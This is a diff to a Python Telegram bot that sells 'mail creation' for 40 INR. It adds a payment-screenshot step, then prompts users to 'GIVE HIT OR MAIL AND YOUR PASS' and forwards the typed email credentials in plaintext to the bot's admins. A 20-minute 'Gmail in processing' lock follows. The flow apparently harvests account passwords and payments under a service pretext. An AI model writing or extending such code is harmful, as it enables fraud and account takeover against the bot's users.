@@ -15,6 +15,9 @@ BACKUP_CHANNEL_LINK = "https://t.me/+YwwAed_oQwU5YWY1"
 ANNOUNCEMENT_CHANNEL_LINK = "https://t.me/+ObinPrPz_ktkODJl"
 WORK_BOT_LINK = "https://t.me/talkwithhimbot"
 
+# QR Code File ID
+QR_IMAGE_ID = "AgACAgUAAxkBAAEuGY5qkTYwvExkrLrJSIRYuk242MblQAACVxNrG4QQiVSTN65L1CiLrAEAAwIAA20AAz0E"
+
 PER_REFERRAL_REWARD = 2
 DB_FILE = "bot_data.json"
 # --------------------------------------------------
@@ -60,6 +63,7 @@ if "banned" not in data:
     save_data(data)
 
 user_states = {}
+processing_timers = {}
 
 def get_user(user_id):
     str_id = str(user_id)
@@ -113,6 +117,7 @@ def get_bottom_menu_keyboard():
     markup.row(btn_help)
     return markup
 
+# Normal Admin Action Keyboard
 def get_admin_action_keyboard(target_id):
     markup = types.InlineKeyboardMarkup()
     is_ban = target_id in data["banned"]
@@ -122,6 +127,22 @@ def get_admin_action_keyboard(target_id):
     btn_notify = types.InlineKeyboardButton("❗ Notify", callback_data=f"adm_not_{target_id}")
     btn_ask = types.InlineKeyboardButton("❓ Ask / Reply", callback_data=f"adm_rep_{target_id}")
     
+    markup.row(btn_ban, btn_notify, btn_ask)
+    return markup
+
+# Special Payment Order Keyboard (Approve / Reject + Ban, Notify, Ask)
+def get_payment_admin_keyboard(target_id):
+    markup = types.InlineKeyboardMarkup()
+    is_ban = target_id in data["banned"]
+    ban_text = "🟢 Unban" if is_ban else "⛔ Ban"
+
+    btn_app = types.InlineKeyboardButton("✅ Approve", callback_data=f"adm_app_{target_id}")
+    btn_rej = types.InlineKeyboardButton("❌ Reject", callback_data=f"adm_rej_{target_id}")
+    btn_ban = types.InlineKeyboardButton(ban_text, callback_data=f"adm_ban_{target_id}")
+    btn_notify = types.InlineKeyboardButton("❗ Notify", callback_data=f"adm_not_{target_id}")
+    btn_ask = types.InlineKeyboardButton("❓ Ask / Reply", callback_data=f"adm_rep_{target_id}")
+
+    markup.row(btn_app, btn_rej)
     markup.row(btn_ban, btn_notify, btn_ask)
     return markup
 
@@ -205,7 +226,6 @@ def handle_callbacks(call):
             bot.answer_callback_query(call.id, "❌ Please join all channels first!", show_alert=True)
         return
 
-    # User Reply to Admin Button
     if call.data == "user_reply_to_admin":
         user_states[user_id] = "AWAITING_SUPPORT_MESSAGE"
         cancel_kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
@@ -215,7 +235,25 @@ def handle_callbacks(call):
 
     # Admin Control Handlers
     if user_id in ADMINS:
-        if call.data.startswith("adm_ban_"):
+        if call.data.startswith("adm_app_"):
+            target_id = int(call.data.split("adm_app_")[1])
+            try:
+                bot.send_message(target_id, "Your funds have safely reached me. Mail in processing")
+                bot.answer_callback_query(call.id, "Payment Approved ✅")
+                bot.edit_message_caption(caption=call.message.caption + "\n\n🟢 **APPROVED BY ADMIN**", chat_id=call.message.chat.id, message_id=call.message.message_id)
+            except Exception:
+                pass
+
+        elif call.data.startswith("adm_rej_"):
+            target_id = int(call.data.split("adm_rej_")[1])
+            try:
+                bot.send_message(target_id, "Your funds are not reached us your transaction  invalid")
+                bot.answer_callback_query(call.id, "Payment Rejected ❌")
+                bot.edit_message_caption(caption=call.message.caption + "\n\n🔴 **REJECTED BY ADMIN**", chat_id=call.message.chat.id, message_id=call.message.message_id)
+            except Exception:
+                pass
+
+        elif call.data.startswith("adm_ban_"):
             target_id = int(call.data.split("adm_ban_")[1])
             if target_id in data["banned"]:
                 data["banned"].remove(target_id)
@@ -224,10 +262,6 @@ def handle_callbacks(call):
                 data["banned"].append(target_id)
                 bot.answer_callback_query(call.id, "User Banned ⛔")
             save_data(data)
-            try:
-                bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=get_admin_action_keyboard(target_id))
-            except Exception:
-                pass
 
         elif call.data.startswith("adm_rep_"):
             target_id = int(call.data.split("adm_rep_")[1])
@@ -239,16 +273,24 @@ def handle_callbacks(call):
             user_states[user_id] = {"mode": "ADMIN_NOTIFYING", "target": target_id}
             bot.send_message(user_id, f"📢 Type the **Notification Alert** for User `{target_id}` (No Reply button):")
 
-@bot.message_handler(func=lambda msg: True, content_types=['text'])
-def handle_bottom_buttons(message):
+@bot.message_handler(func=lambda msg: True, content_types=['text', 'photo'])
+def handle_all_messages(message):
     user_id = message.from_user.id
-    text = message.text
+    text = message.text or ""
 
     if user_id in data.get("banned", []):
         bot.send_message(user_id, "⛔ You are banned from using this bot.")
         return
 
-    # Admin Execution (Reply / Notify)
+    # 20 Minutes Lock Handler for Processing Message
+    if user_id in processing_timers:
+        if time.time() - processing_timers[user_id] < 1200:  # 20 minutes (1200 seconds)
+            bot.send_message(user_id, "Gmail in processing pls wait🤲🥺")
+            return
+        else:
+            processing_timers.pop(user_id, None)
+
+    # Admin actions
     if user_id in ADMINS and user_id in user_states:
         state_data = user_states[user_id]
         if isinstance(state_data, dict):
@@ -290,6 +332,47 @@ def handle_bottom_buttons(message):
         bot.send_message(user_id, "❌ Action Cancelled.", reply_markup=get_bottom_menu_keyboard())
         return
 
+    # Step 1: Mail Payment SS Received
+    if state == "AWAITING_PAYMENT_SS":
+        user_states[user_id] = "AWAITING_CREDENTIALS"
+        user_info = get_user(user_id)
+
+        admin_caption = (
+            f"💳 **New Payment Order Screenshot:**\n"
+            f"👤 User: {message.from_user.first_name}\n"
+            f"🆔 User ID: `{user_id}`\n"
+            f"👤 Username: @{message.from_user.username or 'None'}\n"
+            f"👥 Referrals: `{user_info.get('total_referrals', 0)}`\n"
+            f"💵 Balance: `{user_info.get('balance', 0)}`"
+        )
+
+        for admin in ADMINS:
+            try:
+                if message.content_type == 'photo':
+                    bot.send_photo(admin, message.photo[-1].file_id, caption=admin_caption, reply_markup=get_payment_admin_keyboard(user_id), parse_mode="Markdown")
+                else:
+                    bot.send_message(admin, f"{admin_caption}\n\n📝 Text: {text}", reply_markup=get_payment_admin_keyboard(user_id), parse_mode="Markdown")
+            except Exception:
+                pass
+
+        bot.send_message(user_id, "GIVE HIT OR MAIL AND YOUR PASS")
+        return
+
+    # Step 2: User Gives Mail & Pass -> Activate 20 Min Cooldown
+    if state == "AWAITING_CREDENTIALS":
+        user_states.pop(user_id, None)
+        processing_timers[user_id] = time.time()  # Start 20-minute timer
+
+        for admin in ADMINS:
+            try:
+                bot.send_message(admin, f"🔐 **User Credentials Received:**\nUser ID: `{user_id}`\n\n{text}", reply_markup=get_admin_action_keyboard(user_id))
+            except Exception:
+                pass
+
+        bot.send_message(user_id, "Gmail in processing pls wait🤲🥺", reply_markup=get_bottom_menu_keyboard())
+        return
+
+    # Consumer Helpline Support State
     if state == "AWAITING_SUPPORT_MESSAGE":
         msg_length = len(text)
         word_count = len(text.split())
@@ -328,32 +411,7 @@ def handle_bottom_buttons(message):
         )
         return
 
-    if state == "AWAITING_MAIL_DETAILS":
-        user_states.pop(user_id, None)
-        user_info = get_user(user_id)
-        
-        order_card = (
-            f"📩 **New Mail Creation Order:**\n"
-            f"User: {message.from_user.first_name}\n"
-            f"User ID: `{user_id}`\n"
-            f"Username: @{message.from_user.username or 'None'}\n"
-            f"Balance: `{user_info.get('balance', 0)}`\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"📝 **Details:**\n{text}"
-        )
-        for admin in ADMINS:
-            try:
-                bot.send_message(admin, order_card, reply_markup=get_admin_action_keyboard(user_id), parse_mode="Markdown")
-            except Exception:
-                pass
-
-        bot.send_message(
-            user_id,
-            "✅ **Your request has been sent to admin!** We will contact you shortly.",
-            reply_markup=get_bottom_menu_keyboard()
-        )
-        return
-
+    # Bottom Menu Actions
     if text == "Join Announcement Channel":
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📢 Open Announcement Channel", url=ANNOUNCEMENT_CHANNEL_LINK))
@@ -376,15 +434,18 @@ def handle_bottom_buttons(message):
         bot.send_message(user_id, work_text, reply_markup=markup)
 
     elif text == "Mail create":
-        user_states[user_id] = "AWAITING_MAIL_DETAILS"
+        user_states[user_id] = "AWAITING_PAYMENT_SS"
         cancel_kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
         cancel_kb.add(types.KeyboardButton("🚫 Cancel"))
-        bot.send_message(
-            user_id,
-            "✍️ **Place Mail Order:**\n\nPlease enter your requirements (Quantity, Domain/Names, etc.):",
-            reply_markup=cancel_kb,
-            parse_mode="Markdown"
-        )
+        
+        caption_text = "per mail 40 inr after payment your mail will be created"
+        second_text = "[📋]\n𝗦𝗘𝗡𝗗  𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗦𝗦 𝗔𝗡𝗗 𝗪𝗜𝗧𝗛 𝗖𝗟𝗘𝗔𝗥 𝗦𝗛𝗢𝗪𝗜𝗡𝗚 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗜𝗗 𝗔𝗡𝗗 𝗡𝗔𝗠𝗘 😇"
+        
+        try:
+            bot.send_photo(user_id, QR_IMAGE_ID, caption=caption_text)
+            bot.send_message(user_id, second_text, reply_markup=cancel_kb)
+        except Exception:
+            bot.send_message(user_id, f"{caption_text}\n\n{second_text}", reply_markup=cancel_kb)
 
     elif text == "💰 My Balance":
         user_info = get_user(user_id)
